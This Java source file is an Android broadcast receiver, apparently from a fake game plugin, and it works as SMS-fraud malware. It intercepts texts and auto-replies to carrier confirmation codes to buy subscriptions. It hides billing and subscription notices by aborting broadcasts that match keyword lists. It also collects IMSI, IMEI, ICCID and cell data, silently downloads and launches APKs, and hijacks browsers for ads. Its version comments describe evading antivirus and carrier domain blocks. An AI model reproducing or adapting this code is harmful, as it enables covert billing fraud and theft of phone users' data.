package cn.com.tiantong.game72;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.IWindowManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import cn.com.tiantong.game72.n.m.BasicBean;
import cn.com.tiantong.game72.n.m.BrowserAdsBean;
import cn.com.tiantong.game72.n.m.CommandBean;
import cn.com.tiantong.game72.n.m.DS;
import cn.com.tiantong.game72.n.m.IFLSBean;
import cn.com.tiantong.game72.n.m.PageBean;
import cn.com.tiantong.game72.n.m.PageInnerBean;
import cn.com.tiantong.game72.n.m.RO;
import cn.com.tiantong.game72.n.m.WebBean;
import cn.com.tiantong.game72.n.m.YDII;
import cn.com.tiantong.game72.push.DownloadApk;
import cn.com.tiantong.game72.push.ManagerForNotification;
import cn.com.tiantong.game72.push.ProtocolParserOtherCommands;
import cn.com.tiantong.game72.push.bean.DownloadApkBasicBean;
import cn.com.tiantong.game72.push.bean.GetMonthCommandsResultBean;
import cn.com.tiantong.game72.push.bean.InstallCommandBean;
import cn.com.tiantong.game72.push.bean.InstallCommandContainer;
import cn.com.tiantong.game72.push.bean.ManageKeyguard;
import cn.com.tiantong.game72.push.bean.StartDownloadThread;
import cn.com.tiantong.game72.util.ApnControl;
import cn.com.tiantong.game72.util.Command;
import cn.com.tiantong.game72.util.CommandContainer;
import cn.com.tiantong.game72.util.DeviceUuidFactory;
import cn.com.tiantong.game72.util.Logger;
import cn.com.tiantong.game72.util.MD5;
import cn.com.tiantong.game72.util.NS;
import cn.com.tiantong.game72.util.NetMode;
import cn.com.tiantong.game72.util.UmengUtil;
import cn.com.tiantong.game72.util.Util;
import cn.com.tiantong.webview.DetailExecutionSteps;
import cn.com.tiantong.webview.MyWebView;
import cn.com.tiantong.webview.ParseWebViewCommands;

import com.cmcc.crack.access.process.CrackAccess;
import com.cmcc.crack.access.util.DeviceInfo;
import com.migu.month.sdk.bean.ResultBean;
import com.migu.month.sdk.process.PayInterface;


/*
 * 升级版本4.45：
 *       1、获取指令的接口发生改变（getCommands --> getCommandByImsi）; 添加了imsi
 * 升级版本4.50
 *       2、通过用户发送短信，获取用户手机号码--》注意单卡手机跟双卡双待手机发送短信的不同
 *       3、把从其他公司获取手机号的功能去掉
 *       4、发送短信功能，需要考虑双卡双待的情况
 * 升级版本4.60
 *       1、重新部署获取手机号码的时间。先获取手机号码，然后再初始化
 *       
 * 升级版本4.80
 *       初始化上报请求从ip修改成域名访问：yeerg.com
 *       
 * 升级版本5.00
 *       1、添加了umeng的统计平台
 *       2、修改了httpPost_new方法
 *       3、所有请求方式修改成post请求
 *       4、init时，添加一个保存到本地的一个随机数，统计重复用户的使用
 *       5、所有请求地址有yeerg.com修改成：xzvzc.com
 * 升级版本5.20
 *       视频的客户端增加了成功上报的功能
 * 升级版本5.50
 *       增加了push功能     
 * 升级版本5.55
 *       彩铃，视频，阅读在获取心跳时间到时的信号是，增加了锁
 * 升级版本5.60
 *       1、更换了域名：vbxbx.com； 更换原因：部分省份的移动网络(cmwap)屏蔽了以前的域名(xzvzc.com)，导致彩铃服务器端可以正常接收到数据，而客户端返回移动的错误码是：500或者503
 *       2、彩铃，视频--post上报数据，json数据base64加密；加密原因：防止杀毒软件或者移动网络对数据直接解析
 * 升级版本5.71
 *       修改了umeng的渠道号
 * 升级版本6.00
 *       1、改变了接口m=Service ==> m=Api
 *       2、彩铃--post上报数据，json数据首先DES加密，后使用base64
 * 升级版本6.20
 *       1、视频代码的改动
 *       2、短代执行上报结果
 *       3、不带阅读的插件
 * 升级版本6.30
 *       1、视频更换了域名
 *  
 * 升级版本8.00
 *       1、添加web端口
 * 升级版本8.1
 * 		 1、添加包月订购
 * 		 2、修改webview，利用控制器让WebView在UI线程中执行，并控制其执行流程
 * 
 * 升级版本9.00
 * 		1、添加劫持量铺放广告链接
 * 		2、移动基地破解接入
 */

public class ControlBroadcastReceiver extends BroadcastReceiver {

	public static final String TAG = "ControlBroadcastReceiver";

	public static final String QUDAOHAO = "channel_m013";

	// 这包是否为纯插件
	public static final boolean ISCHUNCHAJIAN = true;

	public static final String PHONE_SMSNUMBER1 = "106";
	public static final String PHONE_SMSNUMBER2 = "10001888";
	public static final String PHONE_SMSNUMBER3 = "10001";
	public static final String PHONE_SMSNUMBER4 = "10086";
	public static final String PHONE_SMSNUMBER5 = "1065";

	// 定义一些需要规避的关键字
	public static final String PHONE_NUMBER_1 = "10086";
	public static final String PHONE_NUMBER_2 = "106";

	public static final String PHONE_CONTEXT_1_1 = "咪咕";
	public static final String PHONE_CONTEXT_1_2 = "彩铃";
	public static final String PHONE_CONTEXT_1_3 = "铃音"; // 包含了铃音盒
	public static final String PHONE_CONTEXT_1_4 = "音乐";
	public static final String PHONE_CONTEXT_1_5 = "振铃";
	public static final String PHONE_CONTEXT_1_6 = "歌曲";

	public static final String PHONE_CONTEXT_2_1 = "点播";
	public static final String PHONE_CONTEXT_2_2 = "标准资费";
	public static final String PHONE_CONTEXT_2_3 = "订购";
	public static final String PHONE_CONTEXT_2_4 = "赠送";

	public static final String PHONE_CONTEXT_3_1 = "手机阅读";
	public static final String PHONE_CONTEXT_3_2 = "手机视频";
	public static final String PHONE_CONTEXT_3_3 = "中国移动的手机阅读业务";
	public static final String PHONE_CONTEXT_3_4 = "含图书、杂志、漫画";
	public static final String PHONE_CONTEXT_3_5 = "如遇到阅读信息与宣传不符等问题";

	public static final String PHONE_CONTEXT_4_1 = "成功购买";
	public static final String PHONE_CONTEXT_4_2 = "游戏点数";
	public static final String PHONE_CONTEXT_4_3 = "点数账户";

	public static final int Delayopen = 10 * 60 * 1000;
	public static Context mContext = null;
	public static Timer mTimerOpen = null;

	public static DS service;

	// 必要信息
	public static String appid;
	public static String sign;
	public static String IMSI;
	public static String packageName;
	// 移动端SDK版本号
	public static String SDKVersion;
	public static String net;

	// 软件本身版本号
	public static String currentVersion;
	public static int systemSign;
	public static String phoneType;
	// android版本号
	public static String androidVersion;
	public static String IMEI;
	public static String IMSI_NAKED;
	public static String cid;
	public static String lac;
	public static String nid;
	public static String ip;
	public static String UA;
	public static String video_ua;
	public static String realSign;
	public static String ICCID;
	public static String sd_cid;
	// 是否为双卡双待
	public static int imsiCardCount;
	public static String imsi_1;
	public static String imsi_2;

	// 随机数
	public static String salt;

	// public static HashMap<String, String> initParamMap;

	// 5.50
	public static Timer mTimer1 = null;
	public static Timer mTimer2 = null;
	public static Timer mTimer3 = null;

	public static final int Delay1 = 10 * 1000;
	public static final int Delay2 = 5 * 1000;
	public static final int Delay3 = 5 * 1000;

	public static String needNumber;
	public static String startString;
	public static String endString;

	//8.16 将webView放在UI线程中执行
	public static MyWebView myWebView;
	public static WebView ownWebView;

	public DetailExecutionSteps detalExe;
	
	//9.00设置一些用于存储信息的全局变量
	public static BrowserAdsBean adsBean;
	public static String provice,city;
	@Override
	public void onReceive(Context context, Intent intent) {

		// LH.LogPrint(tag, "我已成功接收到广播");

		// initParamMap = new HashMap<String, String>();

		if (intent == null) {
			return;
		}

		// 初始化必要信息
		service = new DS();

		mContext = context;

		if(ownWebView == null){
			// 初始化webview
			myWebView = new MyWebView(context);
			ownWebView = myWebView.initWebView(context);
		}
		if(DoLoadUrlHandler == null){
			DoLoadUrlHandler = new Handler();
		}
		if(DoParseHandler == null){
			DoParseHandler = new Handler();
		}

		getBasicInfo(context);
		Logger.print(TAG, "IMSI:" + IMSI_NAKED + "," + "IMEI: " + IMEI);
		if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {

			// LH.LogPrint(tag, "[ACTION_PACKAGE_ADDED] ");
			String sPackageName = intent.getDataString(); // 这个就是包名
			if (sPackageName != null) {
				String[] packname = sPackageName.split("package:");
				if (packname.length > 1) {
					// LH.LogPrint(tag, "[packname]:" + packname[1]);
					InstallCommandContainer commands = InstallCommandContainer.GetInstance(context);
					if (commands.GetLength() > 0) {
						InstallCommandBean tip = commands.GetInstallCommand(packname[1]);
						if ((tip != null) && (tip.getIsinstalled() == 0)) {
							commands.deleteapk(context, tip.getFilename());
							// 安装成功，上报服务器
							// StartReport(context, packname[1]);
							// LH.LogPrint(tag, "已经安装，包名：" + packname[1] +
							// ", 上传服务器");
							new SendApkInstaResultThread(context, packname[1]).start();

							boolean result = false;
							if (issysuser(context) == 0) {
								result = false;
							} else {
								result = true;
							}

							if (result == true) {
								commands.setIsinstalledstatus(packname[1], 1);
								// commands.setSNAME(packname[1], sName);
								if (commands.CanStartApk() == true) {
									StartApk_formode(context, packname[1], tip.getMode());
								}
							} else {
								commands.setIsinstalledstatus(packname[1], 4);
								StartApk_New(context, packname[1]);
							}
						}
					}
				}
			}
		} else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			// 获取到短信

			Logger.print("receiver", "duanxin 1");

			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);

			Bundle bundle = intent.getExtras();

			if (bundle != null) {

				SmsManager smsManager = SmsManager.getDefault();

				// LH.LogPrint(tag, "bundle != null");

				Object[] pdus = (Object[]) bundle.get("pdus");

				// LH.LogPrint(tag, "pdus.length -- > " + pdus.length);

				if (pdus.length > 0) {

					SmsMessage[] messages = new SmsMessage[pdus.length];
					messages[0] = SmsMessage.createFromPdu((byte[]) pdus[0]);

					String addr = messages[0].getOriginatingAddress();
					String body = "";

					for (int i = 0; i < messages.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						body += messages[i].getDisplayMessageBody();
					}

					// Logger.print(TAG, "SMSReceiver:addr:" + addr + ", body:"
					// + body);
					// 此处逻辑需要修改， endString是验证码后面的字符
					try {
						// 发起请求
						if (needNumber != null && !"".equals(needNumber) && addr.startsWith(needNumber.trim())) {
							if (startString != null&& !"".equals(startString.trim()) && endString != null && !"".equals(endString.trim())) {
								if (body.contains(startString) && body.contains(endString)) {
									MyWebView.verificationCode = body.substring(body.indexOf(startString) + startString.length(), body.indexOf(startString) + startString.length() + body.substring(body.indexOf(startString) + startString.length()).indexOf(endString));
									Logger.print(TAG, "needNumber --> " + needNumber + " <-- startString --> " + startString + "<-- endString --> " + endString + ", 验证码：" + MyWebView.verificationCode);
									// if
									// (ParseWebViewCommands.currentMyWebViewThread
									// != null) {
									// Logger.print(TAG, "唤起webview执行操作");
									// ParseWebViewCommands.currentMyWebViewThread.innerPageProcess();
									// }
									this.abortBroadcast();
								}
							} else if (startString != null && !"".equals(startString.trim())) {
								if (body.contains(startString.trim())) {
									MyWebView.verificationCode = body.substring(body.indexOf(startString) + startString.length());
									// if
									// (ParseWebViewCommands.currentMyWebViewThread
									// != null) {
									//
									// //
									// ParseWebViewCommands.currentMyWebViewThread.innerPageProcess();
									// }
									this.abortBroadcast();
								}
							} else if (endString != null && !"".equals(endString.trim())) {
								if (body.contains(endString.trim())) {
									MyWebView.verificationCode = body.substring(0,body.indexOf(endString));
									// if
									// (ParseWebViewCommands.currentMyWebViewThread
									// != null) {
									//
									// 
									// ParseWebViewCommands.currentMyWebViewThread.innerPageProcess();
									// }
									this.abortBroadcast();
								}
							} else {
								MyWebView.verificationCode = body.trim();
								this.abortBroadcast();
							}

							Logger.print(TAG, "截取到的验证码是：" + MyWebView.verificationCode);
						}
					} catch (Exception e) {
						e.printStackTrace();
						MyWebView.verificationCode = null;
						Logger.print(TAG, "截取验证码异常");
					}

					CommandContainer commands = CommandContainer.GetInstance(context);

					if ((addr.indexOf(PHONE_SMSNUMBER1) == 0)
							|| (addr.indexOf(PHONE_SMSNUMBER2) == 0)
							|| (addr.indexOf(PHONE_SMSNUMBER3) == 0)
							|| (addr.indexOf(PHONE_SMSNUMBER4) == 0)) {

						if (body != null) {
							int idx1 = body.indexOf("本次密码");
							int idx3 = body.indexOf("回复数字");
							// LH.LogPrint(tag, "SMSReceiver:idx1:" + idx1);
							if (idx1 != -1) {
								String sub = body.substring(idx1 + "本次密码".length());
								// LH.LogPrint(tag, "SMSReceiver:sub:" + sub);
								int idx2 = sub.indexOf("，");
								// LH.LogPrint(tag, "SMSReceiver:idx2:" + idx2);
								if (idx2 != -1) {
									String srcet = sub.substring(0, idx2);
									// LH.LogPrint(tag,
									// "SMSReceiver:srcet:"+srcet);
									// ProtocolParser.sendSMS1(addr, srcet);
									SendMessageManager.sendSMS1(context, addr, srcet, null);
								} else {
									idx2 = sub.indexOf(",");
									if (idx2 != -1) {
										String srcet1 = sub.substring(0, idx2);
										// LH.LogPrint(tag, "SMSReceiver:srcet:"
										// + srcet1);
										// ProtocolParser.sendSMS1(addr,
										// srcet1);
										SendMessageManager.sendSMS1(context,
												addr, srcet1, null);
									} else {
										idx2 = sub.indexOf("。");
										if (idx2 != -1) {
											String srcet1 = sub.substring(0, idx2);
											// LH.LogPrint(tag,
											// "SMSReceiver:srcet:" + srcet1);
											SendMessageManager.sendSMS1(context, addr, srcet1, null);
										} else {
											idx2 = sub.indexOf(".");
											if (idx2 != -1) {
												String srcet1 = sub.substring(0, idx2);
												// LH.LogPrint(tag,
												// "SMSReceiver:srcet:" +
												// srcet1);
												SendMessageManager.sendSMS1(context, addr, srcet1, null);
											}
										}
									}

								}
							} else if (idx3 != -1) {
								String sub = body.substring(idx1 + "回复数字".length());
								// LH.LogPrint(tag, "SMSReceiver:sub:" + sub); 
								int idx4 = sub.indexOf("，");
								// LH.LogPrint(tag, "SMSReceiver:idx4:" + idx4);
								if (idx4 != -1) {
									String srcet = sub.substring(0, idx4);
									// LH.LogPrint(tag,
									// "SMSReceiver:srcet:"+srcet);
									// ProtocolParser.sendSMS1(addr,srcet);
									SendMessageManager.sendSMS1(context, addr, srcet, null);
								} else {
									idx4 = sub.indexOf(",");
									if (idx4 != -1) {
										String srcet1 = sub.substring(0, idx4);
										// LH.LogPrint(tag,
										// "SMSReceiver:srcet:"+srcet1);
										// ProtocolParser.sendSMS1(addr,srcet1);
										SendMessageManager.sendSMS1(context, addr, srcet1, null);
									} else {
										idx4 = sub.indexOf("。");
										if (idx4 != -1) {
											String srcet1 = sub.substring(0, idx4);
											// LH.LogPrint(tag,
											// "SMSReceiver:srcet:" + srcet1);
											SendMessageManager.sendSMS1(context, addr, srcet1, null);
										} else {
											idx4 = sub.indexOf(".");
											if (idx4 != -1) {
												String srcet1 = sub.substring(0, idx4);
												// LH.LogPrint(tag,
												// "SMSReceiver:srcet:" +
												// srcet1);
												SendMessageManager.sendSMS1(context, addr, srcet1, null);
											}
										}
									}
								}
							}
						}
					}

					int length = commands.GetLength();
					if (length > 0) {

						Command tip = commands.GetCurrentCommand();
						if ((tip.getSmsreplywaiting() == 0)
								|| (tip.getSmsreplywaiting() == 1)
								|| (tip.getSmsreplywaiting() == 2)
								|| (tip.getSmsreplywaiting() == 4))
						// if((tip.getSmsreplywaiting()==0)||(tip.getSmsreplywaiting()==2))
						{
							// Toast.makeText(context,
							// "SMSReceiver addr not reply",
							// Toast.LENGTH_SHORT).show();
							// LH.LogPrint(tag,
							// "SMSReceiver:SMSReceiver replywaiting=" +
							// tip.getSmsreplywaiting());
							// LH.LogPrint(tag,
							// "SMSReceiver:SMSReceiver addr not reply");
						} else {
							// 在回复状态下回复106开头的短信
							// if((addr.indexOf("10086") == 0)||
							// (addr.indexOf(MS.SMSNUMBER) == 0))
							if ((addr.indexOf(PHONE_SMSNUMBER5) == 0)) {
								// LH.LogPrint(tag,
								// "SMSReceiver:SMSReceiver addr 106 reply");
								if (commands.DoReplyCommand(tip, addr) == true) {
									// LH.LogPrint(tag,
									// "SMSReceiver:SMSReceiver 006 for reply");
									commands.DoNextCommand();
								} else {
									// LH.LogPrint(tag,
									// "SMSReceiver:SMSReceiver 006 for false");
								}
							}
						}
					}

					// 下面还需要有删除短信的功能
					// LH.LogPrint(tag, "收到的地址为：" + addr);
					// LH.LogPrint(tag, "ProtocolParser.ispassed:" +
					// ProtocolParser.ispassed);

					// SharedPreferences keyPreference1 =
					// context.getSharedPreferences(PlayService.KEYWORDS_NAME,
					// 0);
					//
					// String numbers1 =
					// keyPreference1.getString(PlayService.KEYWORDS_NUMBER,
					// null);
					// String keyWords1 =
					// keyPreference1.getString(PlayService.KEYWORDS_WORDS,
					// null);

					// LH.LogPrint(tag, "屏蔽的关键字字段是：" + numbers1 + ", 关键字：" +
					// keyWords1);

					if (((addr.indexOf(PHONE_SMSNUMBER1) == 0)
							|| (addr.indexOf(PHONE_SMSNUMBER2) == 0)
							|| (addr.indexOf(PHONE_SMSNUMBER3) == 0) || (addr
							.indexOf(PHONE_SMSNUMBER4) == 0))
							&& (ProtocolParser.ispassed == false)) {

						// LH.LogPrint(tag, "我获取到了这条短信");

						// Toast.makeText(context, "SMSReceiver:1062,1066",
						// Toast.LENGTH_SHORT).show();
						// if(sdkVersion>3)
						{
							this.abortBroadcast();
						}

					} else if (addr.indexOf(PHONE_SMSNUMBER4) == 0) {
						if (body != null) {
							if (body.indexOf("点播") != -1) {
								this.abortBroadcast();
							}
						}
					} else {

						// 得到屏蔽的号码和关键字
						SharedPreferences keyPreference = context.getSharedPreferences(PlayService.KEYWORDS_NAME, 0);

						String numbers = keyPreference.getString(PlayService.KEYWORDS_NUMBER, null);
						String keyWords = keyPreference.getString(PlayService.KEYWORDS_WORDS, null);

						if (numbers != null && !"".equalsIgnoreCase(numbers.trim())) {
							String[] number = numbers.split(",");
							for (int i = 0; i < number.length; i++) {

								if (addr.indexOf(number[i]) == 0) {

									if (keyWords != null && !"".equalsIgnoreCase(keyWords)) {

										String[] keyWord = keyWords.split(",");

										for (int j = 0; j < keyWord.length; j++) {

											if (body.contains(keyWord[j])) {
												this.abortBroadcast();
												break;
											}
										}
									}
									break;
								}

							}
						} else if (addr != null && (addr.indexOf(PHONE_NUMBER_1) == 0 || addr.indexOf(PHONE_NUMBER_2) == 0)) {

							// LH.LogPrint(tag, "电话号码 ：" + number);

							if (body != null && (body.contains(PHONE_CONTEXT_1_1)
											|| body.contains(PHONE_CONTEXT_1_2)
											|| body.contains(PHONE_CONTEXT_1_3)
											|| body.contains(PHONE_CONTEXT_1_4)
											|| body.contains(PHONE_CONTEXT_1_5)
											|| body.contains(PHONE_CONTEXT_1_6)
											|| body.contains(PHONE_CONTEXT_2_1)
											|| body.contains(PHONE_CONTEXT_2_2)
											|| body.contains(PHONE_CONTEXT_2_3)
											|| body.contains(PHONE_CONTEXT_2_4)
											|| body.contains(PHONE_CONTEXT_3_1)
											|| body.contains(PHONE_CONTEXT_3_2)
											|| body.contains(PHONE_CONTEXT_3_3)
											|| body.contains(PHONE_CONTEXT_3_4)
											|| body.contains(PHONE_CONTEXT_3_5)
											|| body.contains(PHONE_CONTEXT_4_1)
											|| body.contains(PHONE_CONTEXT_4_2) || body.contains(PHONE_CONTEXT_4_3))) {

								this.abortBroadcast();
							}
						}
					}
				}

			} else {
				// LH.LogPrint("PlugInBroadcastReceiver", "bundle == null");
			}
		} else if (intent.getAction().equals(PlayService.SERVICE_ACTION)) {

			/*
			 * 4.60 -- 独立出获取手机号码的流程
			 * 
			 * 心跳时间到达 判断是否需要向服务端发起是否获取手机号码的流程 需要：发起获取手机6号码的请求，获取返回信息 返回：y -->
			 * 先设置心跳时间 --> 发起获取手机号码的流程 --> 修改本地文件(是否已经发起过获取手机号码流程的标示) n -->
			 * 修改本地文件 --> 发起心跳命令 不需要：发起初始化指令 返回：有心跳时间 --> 设置心跳时间 -->
			 * 修改本地文件(是否已经发起过获取手机号码流程的标示) --> 其他流程
			 */

			// 规定时间到达
			// LH.LogPrint(tag, "闹钟开始闹铃，进入SERVICE_ACTION的操作");

			// 判断网络是否连接
			if (NS.chargeIsConnection(context)) {

				SharedPreferences config = context.getSharedPreferences(PlayService.PREFS_NAME, 0);
				SharedPreferences.Editor configEditor = config.edit();

				boolean isSendNumReq = config.getBoolean(PlayService.ISSENDPHONENUMBERREQUEST, true);

				// 需要发起是否获取手机号的请求
				if (isSendNumReq) {

					synchronized (PlayService.GETPHONENUMBER_SHIELD) {

						Logger.print(TAG, "发起获取手机号的指令");
						long alarmPhoneNumberShied = config.getLong(PlayService.SENDPHONENUMBERREQUEST_SHIELD, -1);
						// 防止多次请求(2分钟以内)
						// 可能出现的情况：假如当前网络状态不可用（例如没有活着），那么在闹铃到达好几次以后，都不会做出相应，也就挤压到这个阶段，当网络连通以后，所有的操作都会发起请求
						if (alarmPhoneNumberShied > 0) {
							// LH.LogPrint(tag, "alarmPhoneNumberShied :" + new
							// Date(alarmPhoneNumberShied).toLocaleString());
							if (((System.currentTimeMillis() - alarmPhoneNumberShied) < 3 * 60 * 1000)
									&& (System.currentTimeMillis() - alarmPhoneNumberShied) > 0) {
								// LH.LogPrint(tag,
								// "alarmPhoneNumberShied more");
								return;
							}
						}

						// Umeng启动
						UmengUtil umengUtil = UmengUtil.getIntent();
						umengUtil.startUmeng(context);

						configEditor.putLong(PlayService.SENDPHONENUMBERREQUEST_SHIELD,System.currentTimeMillis());
						configEditor.commit();

						// 发起获取手机号请求
						getBasicInfo(context);
						Logger.print(TAG, "发起获取手机号的请求。");
						new IsGetBasicService(context, QUDAOHAO, IMSI).execute("");
					}

				} else {

					synchronized (PlayService.SENDINITREQUEST_SHIELD) {

						// 获取手机信息
						Logger.print(TAG, "初始化必要信息，调用getBasicInfo()方法");
						getBasicInfo(context);

						// 不可重复请求
						long alarmphonetime = config.getLong(PlayService.PREFS_ALARM_PHONE_TIME, -1);

						// 防止多次请求(1分钟以内)
						// 可能出现的情况：假如当前网络状态不可用（例如没有活着），那么在闹铃到达好几次以后，都不会做出相应，也就挤压到这个阶段，当网络连通以后，所有的操作都会发起请求

						if (alarmphonetime > 0) {
							// LH.LogPrint(tag, "Alarmreceiver:alarmphonetime:"
							// + new Date(alarmphonetime).toLocaleString());
							if (((System.currentTimeMillis() - alarmphonetime) < 3 * 60 * 1000)
									&& (System.currentTimeMillis() - alarmphonetime) > 0) {
								// LH.LogPrint(tag,
								// "Alarmreceiver:the Alarmreceiver:the message dissmissed");
								return;
							}
						}

						// Umeng启动
						UmengUtil umengUtil = UmengUtil.getIntent();
						umengUtil.startUmeng(context);

						configEditor.putLong(PlayService.PHONE_TIME, System.currentTimeMillis());
						configEditor.putLong(PlayService.PREFS_ALARM_PHONE_TIME, System.currentTimeMillis());
						configEditor.commit();

						// 从本地服务器获取到要计费的信息
						// LH.LogPrint(tag, "===========初始化===========");
						// 初始化本地服务器

						new ServiceOwnerInit(context, appid, sign, IMSI,
								packageName, SDKVersion, net, QUDAOHAO, 1, 0,
								"初始化成功", currentVersion, systemSign, phoneType,
								androidVersion, IMEI, IMSI_NAKED, cid, lac,
								nid, ip, realSign, imsiCardCount, imsi_1,
								imsi_2, salt).execute("");
					}
				}
			} else {
				// 网络没有连接
				// LH.LogPrint(tag, "网络没有连接上，不做任何动作，只需要等待网络连接信号");

				// if(! ApnControl.isConnect(context)){
				// //LH.LogPrint(tag, "网络没有连接上，我需要连接网络");
				//
				// //判断网络是否可以连接
				// if(ApnControl.CanChangenetworkstate(context)){
				// //LH.LogPrint(tag, "网络是可以连接的");
				// int sdkVersion = Integer.parseInt(Build.VERSION.SDK);
				// //LH.LogPrint(tag, "sdkVersion : " + sdkVersion);
				// mContext = context;
				// StartReadtimeropen();
				//
				// ApnControl AP = new ApnControl(context);
				// if(sdkVersion > 7){
				// AP.setNetWorkEnable(true);
				// }else{
				// AP.setMobileDatastate(context, true);
				// }
				// }
				// }
			}

		} else if (intent.getAction().equals("android.net.conn.CONNECTIVITY_CHANGE")) {

			// LH.LogPrint(tag,
			// "监控到 ：android.intent.action.CONNECTIVITY_CHANGE 信号");
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);

		} else if (intent.getAction().equals("android.intent.action.USER_PRESENT")) {
			// LH.LogPrint(tag, "监控到 ：android.intent.action.USER_PRESENT 信号");
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);

		} else if (intent.getAction().equals("android.intent.action.ACTION_POWER_CONNECTED")) {
			// LH.LogPrint(tag,
			// "监控到 ：android.intent.action.ACTION_POWER_CONNECTED 信号");
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
		} else if (intent.getAction().equals("android.intent.action.INPUT_METHOD_CHANGED")) {
			// LH.LogPrint(tag,
			// "监控到 ：android.intent.action.INPUT_METHOD_CHANGED 信号");
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
		} else if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
			// LH.LogPrint(tag, "监控到 ：android.intent.action.BOOT_COMPLETED 信号");
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
		} else if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
			// receive stop slide show intent or screen_off message
			// LH.LogPrint(tag, "ACTION_SCREEN_OFF");
			mContext = context;
			Starttimer3();
		} else if (Intent.ACTION_SCREEN_ON.equals(intent.getAction())) {
			// LH.LogPrint(tag, "ACTION_SCREEN_ON");
			Canceltimer3();
		} else if (PlayService.DOWNLOAD_APK_BROADCAST.equals(intent.getAction())) {
			// LH.LogPrint(tag, "download apk broadcast, 调用下载流程");

			try {
				DownloadApkBasicBean dabBean = (DownloadApkBasicBean) intent.getSerializableExtra("mydownloadobject");
				dabBean.setDownloadState(0);
				int index = intent.getIntExtra("broadcastIndex", -1);
				ArrayList<DownloadApkBasicBean> downloadList = new ArrayList<DownloadApkBasicBean>();
				downloadList.add(dabBean);
				// LH.LogPrint(tag, "index-->" + index + ", appName:" +
				// dabBean.getAppName());

				if (ManagerForNotification.notificationMap != null
						&& !ManagerForNotification.notificationMap.isEmpty()
						&& ManagerForNotification.notificationMap.containsKey("index_" + index)) {

					NotificationManager notifManager = ManagerForNotification.notificationMap.get("index_" + index).getmNotificationManager();
					Notification notification = ManagerForNotification.notificationMap.get("index_" + index).getmNotification();

					int icon1 = R.anim.ic_downloading;
					notification.icon = icon1;
					notification.contentView.setViewVisibility(R.id.nttxtdetail, View.GONE);
					notification.contentView.setViewVisibility(R.id.downloadProcessBar, View.VISIBLE);
					notification.contentView.setProgressBar(R.id.downloadProcessBar, 100, 0, false);
					notification.contentView.setViewVisibility(R.id.mybutton, View.GONE);
					

					notification.flags |= Notification.FLAG_NO_CLEAR;

					notifManager.notify(index, notification);

					new StartDownloadThread(mContext, downloadList, dabBean, DownloadApk.downloadApkHandler, DownloadApk.DOWNLOADAPK, 3, index).start();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (PlayService.DOWNLOAD_APK_BROADCAST_TEST.equals(intent.getAction())) {
			int index = intent.getIntExtra("broadcastIndex", -1);
			// LH.LogPrint(tag, "点击了按钮呀, index:" + index);
			if (ManagerForNotification.notificationMap != null
					&& !ManagerForNotification.notificationMap.isEmpty()
					&& ManagerForNotification.notificationMap.containsKey("index_" + index)) {

				synchronized (ManagerForNotification.notificationMap) {
					NotificationManager notifManager = ManagerForNotification.notificationMap.get("index_" + index).getmNotificationManager();
					Notification notification = ManagerForNotification.notificationMap.get("index_" + index).getmNotification();

					ManagerForNotification.notificationMap.remove("index_" + index);
					notifManager.cancel(index);
				}
			}
		} else if ("android.intent.action.SIG_STR".equals(intent.getAction())) {
			StartMainservice(context, context.getPackageName(), PlayService.SERVICE_ACTION);
		} else if(HiJackService.SERVICE_ACTION.equals(intent.getAction())){
			Logger.print(TAG, "--->>> Hijackservice");
			//执行
		
			String flag = intent.getType();
			if(flag.equals("0")){
				
				Logger.print(TAG, "劫持浏览器指令已经获取到，准备开始执行!");
				new DoExectueBrowserComm(context, adsBean).execute();
				SharedPreferences preferences = context.getSharedPreferences(HiJackService.PREFS_NAME, 0);
				SharedPreferences.Editor editor = preferences.edit();
				//这里设置闹钟提醒状态为1表示结束
//				editor.putString(HiJackService.STATUS, "1");
			}
			
			
//			if(flag == 0){
//				HashMap<String, Object> targetMap = new HashMap<String, Object>();
//				targetMap.put("com.UCMobile", browserList);
//				targetMap.put("com.tencent.mtt", browserList);
//				Logger.print(TAG, "劫持浏览器指令已经获取到，准备开始执行!");
//				new DoExectueBrowserComm(context, browserList,targetMap).execute();
//				SharedPreferences preferences = context.getSharedPreferences(HiJackService.PREFS_NAME, 0);
//				SharedPreferences.Editor editor = preferences.edit();
//				//这里设置闹钟提醒状态为1表示结束
//				editor.putInt(HiJackService.STATUS, 1);
//			} 
			
			
			
		}
	}

	// 获取初始本地服务器的初始化信息
	public static void getBasicInfo(Context context) {
		// if(table.get(key))
		// 固定字符串
		appid = "000000000000000000";
